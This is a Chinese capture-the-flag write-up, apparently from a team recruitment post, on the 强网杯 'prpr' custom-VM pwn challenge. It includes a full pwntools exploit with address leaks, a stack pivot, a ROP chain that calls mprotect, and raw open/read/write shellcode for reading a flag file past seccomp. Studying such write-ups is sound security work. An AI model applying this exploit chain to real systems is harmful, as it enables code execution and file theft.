---
title: 关于40小时做出prpr而强网杯32小时这件事
contest: N0wayBack 强网杯 / prpr
year: 2024
difficulty: hard
vuln_type: pwn_unknown
tags: [自定义VM, opcode, 二级data段, register5残留, libc/stack泄, 沙箱绕, mprotect, ORW, seccomp, 32小时出题]
attack_chain:
  - N0wayBack 战队招新介绍 (Cain 叶师傅 cainyzb@qq.com)
  - prpr 强网杯 32 小时出题：自定义 VM (printf_chk opcode) + 二级 data 段
  - main 用 menu 循环 user_input pop_r/push_a_num/push_r/is_equal/if_false_jump/call/jmp
  - fun_60 二级 data 段：先 -2150 跳 vm_shellcode
  - 残留 register5=64 控 rip (fun_60 偏移)
  - 接收 %p libc+stack 泄露，%p heap 泄露
  - sl("-1003") sl("-1004") 分两次 32 位输出 64 位 heap
  - heap_base = (heap_h*0x100000000+heap_l) - 0x8d20
  - 改 register 指针指向 vm 栈底，栈迁移
  - leave_ret = 0x0562ec + libc_base
  - pop_rdi=0x2a3e5+libc_base, pop_rsi=0x2be51, pop_rdx_rbx=0x11f497, pop_rsp=0x35732
  - mprotect 7 (heap_base, 0x8000, RWX)
  - ORW syscall shellcode: open ./flag 0 + read fd 0x8000 + write 1
  - seccomp 沙箱: 只能用 open/read/write 不能 one_gadget
key_payload: 'mprotect rop + orw shellcode: open(./flag)→read(0x8000)→write(1) + leave_ret 栈迁移'
one_liner: N0wayBack 战队 40 小时做 prpr 强网杯 32 小时出题：自定义 VM 逃逸 + seccomp ORW + mprotect rop。
lesson: 自定义 VM 逃逸要先控制 vm 内部任意写 (改 register 指针/数据段) → 改主程序返回地址 → 栈迁移 → rop；seccomp 沙箱只能 open/read/write 时用 ORW shellcode 替代 one_gadget。
quality: high
---

# 关于40小时做出prpr而强网杯32小时这件事

## 概览
- **来源**: ctfiot 214225
- **战队**: N0wayBack 联合战队 (Cain 叶师傅 cainyzb@qq.com)
- **赛事**: 强网杯 prpr 题 / 32 小时出题
- **难度**: ⭐⭐⭐⭐⭐

## 战队招新
- 20 余名师傅 + 10 余名特训学生
- 急需二进制大牛

## prpr 题目架构
### main
- printf_chk("%Q%W%B")
- menu 循环: pop_r/push_a_num/push_r/is_equal/if_false_jump/call/jmp
- 6 个分支: call 1/32/110/141/178/209

### VM 内部
- 二级 data 段 (fun_60)
- 残留 register5=64 可控 rip 单字节
- 偏移 -2150 跳到我们的 vm_shellcode

## 攻击链
```python
from pwn import *
context.log_level = 'debug'
libc_base = int(ru("^^")[:-2], 16) - 0x7f09401d5f03 + 0x7f0940162000
a_stack = int(ru("^^")[:-2], 16) - 0x7ffc87a7eb30 + 0x7ffc87a7e5d8 - 24

# 泄露 heap (分两次 32 位)
sl("-1003"); sl("-1004")
heap_l = int(rl()[:-1])
heap_h = int(rl()[:-1])
heap_base = (heap_h * 0x100000000 + (heap_l & 0xFFFFFFFF)) - 0x8d20
my_heap = heap_base + 0x2680 - 8

# 改 register 指针
sl(str(a_stack // 0x100000000)); sl("-1003")
sl(str(a_stack % 0x100000000)); sl("-1004")
leave_ret = 0x0562ec + libc_base
sl(str(leave_ret % 0x100000000))
sl(str(my_heap % 0x100000000)); sl(str(my_heap // 0x100000000))

# 栈迁移 + mprotect + ORW
sl("252")  # read_str_to_data 长度
pop_rdi = 0x2a3e5 + libc_base
pop_rsi = 0x2be51 + libc_base
pop_rdx_rbx = 0x11f497 + libc_base
pop_rsp = 0x35732 + libc_base

code = b'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x02\x00\x00\x00\x48\xbf./flag\x00\x00\x57\x48\x89\xe7\x0f\x05'  # open
code += b'\x48\xc7\xc2\x00\x01\x00\x00\x48\x89\xfe\x48\x89\xc7\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05'  # read
code += b'\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05'  # write

rop = p64(pop_rdi) + p64(heap_base) + p64(pop_rsi) + p64(0x8000) + p64(pop_rdx_rbx) + p64(7) + p64(0) + p64(libc.sym['mprotect'] + libc_base)
rop += p64(my_heap + 80) + code
sl(rop)
```

## 关键技术
- 自定义 VM opcode (printf_chk + 二级 data 段)
- register5 残留 + 单字节控 rip
- heap 分两次 32 位输出
- 改 register 指针触发栈迁移
- mprotect heap RWX + ORW shellcode 绕 seccomp
